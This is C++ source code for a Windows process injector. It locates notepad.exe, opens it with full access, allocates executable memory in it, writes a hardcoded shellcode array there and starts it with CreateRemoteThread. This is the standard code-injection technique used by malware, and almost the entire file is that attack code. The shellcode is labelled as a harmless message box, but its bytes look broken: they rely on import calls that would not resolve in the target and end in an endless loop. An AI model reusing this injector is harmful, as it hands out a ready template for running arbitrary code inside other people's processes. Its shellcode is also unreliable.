#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include <vector>

// 1. The Payload (Shellcode - x64 MessageBox)
unsigned char shellcode[] =
"\x48\x83\xEC\x28\x48\xB9\x75\x73\x65\x72\x33\x32\x2E\x64\x6C\x6C\x48\x89\x8C\x24"
"\x98\x00\x00\x00\x48\x8B\x8C\x24\x98\x00\x00\x00\xFF\x15\x42\x20\x00\x00\x33\xC9"
"\x48\x8D\x15\x1B\x00\x00\x00\x48\x8D\x05\x0F\x00\x00\x00\x45\x33\xC9\xFF\x15\x2D"
"\x20\x00\x00\xEB\xFE\x48\x65\x6C\x6C\x6F\x20\x66\x72\x6F\x6D\x20\x49\x6E\x6A\x65"
"\x63\x74\x69\x6F\x6E\x00\x48\x61\x63\x6B\x65\x64\x00";

// 2. Helper to find the PID of Notepad (Fixed for Wide Strings)
DWORD GetProcessIdByName(const std::wstring& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    // CHANGED: PROCESSENTRY32W ensures we get Wide Strings regardless of project settings
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    // CHANGED: Process32FirstW forces the Wide version of the function
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            // Now we compare wstring to wstring. It will work.
            if (processName == pe.szExeFile) {
                CloseHandle(hSnapshot);
                return pe.th32ProcessID;
            }
        } while (Process32NextW(hSnapshot, &pe)); // CHANGED: NextW
    }
    CloseHandle(hSnapshot);
    return 0;
}

int main() {
    std::cout << "--- Process Injector (Code Injection) ---" << std::endl;
    std::cout << "[*] Looking for notepad.exe..." << std::endl;

    // 1. Find the Victim
    DWORD pid = GetProcessIdByName(L"Notepad.exe");
    if (pid == 0) {
        std::cerr << "[!] Notepad not found! Please open Notepad and try again." << std::endl;
        return 1;
    }
    std::cout << "[+] Found Notepad PID: " << pid << std::endl;

    // 2. Open the Victim Process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        std::cerr << "[!] Failed to open process. Try running CLion as Administrator." << std::endl;
        return 1;
    }

    // 3. Allocate Memory
    void* pRemoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (pRemoteBuffer == NULL) {
        std::cerr << "[!] Failed to allocate memory." << std::endl;
        CloseHandle(hProcess);
        return 1;
    }
    std::cout << "[+] Memory allocated at: " << pRemoteBuffer << std::endl;

    // 4. Write the Payload
    if (!WriteProcessMemory(hProcess, pRemoteBuffer, shellcode, sizeof(shellcode), NULL)) {
        std::cerr << "[!] Failed to write memory." << std::endl;
        CloseHandle(hProcess);
        return 1;
    }
    std::cout << "[+] Payload written to victim memory." << std::endl;

    // 5. Execute!
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "[!] Failed to create remote thread." << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "[+] Remote thread started! Check Notepad!" << std::endl;

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}